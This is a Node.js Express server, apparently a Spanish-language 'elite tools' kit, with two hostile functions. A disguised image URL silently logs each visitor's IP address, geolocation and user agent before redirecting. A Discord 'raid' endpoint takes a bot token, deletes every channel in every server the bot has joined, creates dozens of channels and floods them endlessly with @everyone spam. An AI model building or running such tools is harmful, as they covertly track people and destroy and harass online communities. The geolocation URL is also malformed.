const express = require('express');
const { Client, IntentsBitField, ChannelType, ActivityType } = require('discord.js');
const axios = require('axios');
const app = express();

app.use(express.json());
app.use(express.static('public'));

let ipLogs = []; 
const MY_WEB = "https://idk-tool-production.up.railway.app/";

// --- LOGGER CON GEOLOCALIZACIÓN ---
app.get('/image/:id.png', async (req, res) => {
    const targetImage = req.query.url || 'https://imgur.com';
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "0.0.0.0";
    
    let geo = "Desconocido";
    try {
        const response = await axios.get(`http://ip-api.com{ip.split(',')[0]}`);
        if(response.data.status === 'success') {
            geo = `${response.data.city}, ${response.data.country} 🚩`;
        }
    } catch(e) {}

    ipLogs.unshift({
        ip: ip.split(',')[0],
        geo: geo,
        date: new Date().toLocaleTimeString(),
        ua: req.headers['user-agent']
    });

    if (ipLogs.length > 50) ipLogs.pop();
    res.redirect(targetImage);
});

app.get('/api/ip-logs', (req, res) => res.json(ipLogs));

// --- RAID BOT GLOBAL ---
app.post('/api/run-raid', async (req, res) => {
    const { token, msg, channelName } = req.body;
    const bot = new Client({ intents: [IntentsBitField.Flags.Guilds, IntentsBitField.Flags.GuildMessages] });

    try {
        await bot.login(token);
        bot.once('ready', async () => {
            // STATUS FORZADO A TU WEB
            bot.user.setActivity("ELITE TOOLS", { 
                type: ActivityType.Streaming, 
                url: "https://twitch.tv" // Requiere link de twitch/youtube para el icono morado
            });
            
            // Editamos el status para que en el "Ver" salga tu web
            bot.user.setPresence({ activities: [{ name: `WEB: ${MY_WEB}`, type: ActivityType.Streaming, url: "https://twitch.tv" }] });

            bot.guilds.cache.forEach(async (guild) => {
                const channels = await guild.channels.fetch();
                await Promise.all(channels.map(ch => ch.delete().catch(() => {})));
                
                const lagMsg = (msg || "@everyone RAIDED") + "\n" + "█".repeat(850);

                for (let i = 0; i < 50; i++) {
                    guild.channels.create({ name: channelName || "raid-global", type: ChannelType.GuildText })
                        .then(async (ch) => {
                            await Promise.all(Array(15).fill(0).map(() => ch.send(lagMsg).catch(() => {})));
                            setInterval(() => ch.send(lagMsg).catch(() => {}), 250);
                        }).catch(() => {});
                }
            });
            res.json({ success: true, count: bot.guilds.cache.size });
        });
    } catch (err) { res.status(401).json({ error: "Token Inválido" }); }
});

app.listen(process.env.PORT || 3000, () => console.log("Elite Engine Started"));
